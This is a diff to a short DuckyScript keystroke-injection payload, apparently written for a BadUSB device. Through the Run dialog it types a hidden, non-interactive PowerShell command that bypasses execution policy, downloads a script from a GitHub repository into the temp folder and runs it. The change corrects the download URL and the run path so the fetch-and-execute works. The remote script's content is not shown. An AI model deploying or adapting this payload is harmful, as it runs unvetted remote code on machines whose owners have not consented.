@@ -14,5 +14,5 @@ REM     ------------------------------------------------------------------------
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://github.com/flippyflipflap/snuts/blob/main/ADV-RR/rr.ps1' -O "$D\rr.ps1";. "$D\rr\rr.ps1"
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/flippyflipflap/snuts/main/ADV-RR/rr.ps1' -O "$D\rr.ps1";. "$D\rr.ps1"
 ENTER
